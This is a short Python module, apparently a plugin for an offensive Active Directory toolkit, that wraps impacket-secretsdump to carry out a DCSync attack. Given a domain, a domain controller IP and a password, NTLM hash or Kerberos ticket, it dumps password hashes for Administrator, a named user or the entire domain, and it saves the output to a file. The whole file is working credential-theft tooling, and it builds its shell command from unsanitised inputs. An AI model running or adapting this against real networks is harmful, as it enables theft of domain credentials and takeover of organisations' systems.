def run(data, cred, args):
    import subprocess
    from pathlib import Path

    # ---------------- INPUT ----------------
    domain = data.get("domain")
    ip = data.get("ip")

    user = cred.get("user")
    secret = cred.get("secret")
    cred_type = cred.get("type")


    if not user or not secret:
        print("[!] Missing valid credentials")
        return

    if not domain or not ip:
        print("[!] Missing domain or DC IP")
        return

    # ---------------- FLAGS ----------------
    target_user = getattr(args, "user", None)
    full = getattr(args, "full", False)
    if full and target_user:
        print("[!] Use either --user or --full, not both")
        return

    # ---------------- OUTPUT ----------------
    output_path = args.out or "dcsync.txt"
    output = Path(output_path).expanduser().resolve()

    # ---------------- COMMAND ----------------
    if cred_type == "password":
        base = f"{domain}/{user}:{secret}@{ip}"
        auth = base

    elif cred_type == "ntlm":
        base = f"{domain}/{user}@{ip}"
        auth = f"-hashes :{secret} {base}"

    elif cred_type == "ccache":
        base = f"{domain}/{user}@{ip}"
        auth = f"-k -no-pass {base}"

    else:
        print(f"[!] Unsupported credential type: {cred_type}")
        return
    
    if full:
        cmd = f"impacket-secretsdump {auth}"

    elif target_user:
        cmd = f"impacket-secretsdump -just-dc-user {target_user} {auth}"

    else:
        cmd = f"impacket-secretsdump -just-dc-user Administrator {auth}"

    print(f"[*] Running: {cmd}\n")

    # ---------------- EXECUTION (print + save) ----------------
    with subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True) as proc:
        lines = []

        for line in proc.stdout:
            print(line, end="")   # live output
            lines.append(line)

    if not lines:
        print("[!] No output received")
        return

    # ---------------- SAVE ----------------
    output.write_text("".join(lines))

    print(f"\n[+] Saved output → {output}")